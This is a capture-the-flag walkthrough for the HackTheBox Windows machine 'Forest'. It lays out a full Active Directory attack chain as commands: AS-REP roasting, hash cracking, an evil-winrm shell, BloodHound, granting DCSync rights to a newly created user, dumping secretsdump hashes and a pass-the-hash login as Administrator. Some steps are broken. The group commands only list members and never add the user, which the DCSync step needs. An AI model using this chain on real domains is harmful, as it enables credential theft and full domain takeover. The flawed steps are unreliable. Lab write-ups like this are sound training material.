---
title: "HTB Forest"
permalink: /writeups/access
location: default
---

# HTB Forest

**Machine Information**

	IP : 10.10.10.161
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.161 -- -sC -sV
```

This should reveal a number of services including `kerberos`, `ldap`, and `smb`.

```
PORT      STATE SERVICE      REASON  VERSION
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-06-16 13:40:13Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49682/tcp open  msrpc        syn-ack Microsoft Windows RPC
49704/tcp open  msrpc        syn-ack Microsoft Windows RPC
49976/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-06-16T13:41:05
|_  start_date: 2024-06-16T10:19:43
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-06-16T06:41:03-07:00
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41777/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 44199/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

### Getting a Foothold

**enum4linux**

Start by running `enum4linux` which will reveal a list of usernames.

```
enum4linux -U 10.10.10.161
```

Save these user strings to a text file and we can use `awk` to extract the usernames.

```
awk -F '[][]' '{print $2}' enum_users.txt > usernames.txt
```

**Impacket GetNPUsers**

With a list of usernames we can now use `impacket-GetNPUsers` for some AS-REP Roasting.

```
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile usernames.txt -format hashcat -outputfile hashes
```

**Hashcat**

If done correctly we should receive one hash back for the user `svc-alfresco` that we can crack using `hashcat`.

```
hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt
```

This will reveal credentials for the user `svc-alfresco`.

**Evil-WinRM**

Using these credentials and `evil-winrm` we can get a shell.

```
evil-winrm -i 10.10.10.161 -u svc-alfresco
```

Grab the flag from the user desktop.

```
type C:\Users\svc-alfresco\Desktop\user.txt
```

### Privilege Escalation

**BloodHound**

To check for potential privilege escalation methods upload `SharpHound.exe` to the target server and run it.

```
.\SharpHound.exe
```

Use our `evil-winrm` session to download it.

```
download 20240616071834_BloodHound.zip
```

Open it in BloodHound. This will show that the user `svc-alfresco` has the "GenericAll" permission which we can potentially exploit.

<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-group>

Start by creating our own user to exploit.

```
net user null null123 /add /domain
net group "EXCHANGE WINDOWS PERMISSIONS"
net localgroup "Remote Management Users"
```

**DCSync**

Now to abuse the DCSync upload `PowerView.ps1` to the target system and enter the following commands:

```powershell
Import-Module .\PowerView.ps1
$Password = ConvertTo-SecureString 'null123' -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential('htb.local\null', $Password)
Add-ObjectACL -PrincipalIdentity null -Credential $Credential -Rights DCSync
```

**Secrets Dump**

Once completed use `impacket-secretsdump` to dump the hashes.

```
impacket-secretsdump null:null123@10.10.10.161
```

This will reveal the hash for the Administrator that we can use to perform a Pass-the-Hash attack.

**Pass-the-Hash**

```
impacket-psexec htb.local/administrator@10.10.10.161 -hashes HASH
```

Grab the flag.

```
type C:\Users\Administrator\Desktop\root.txt
```
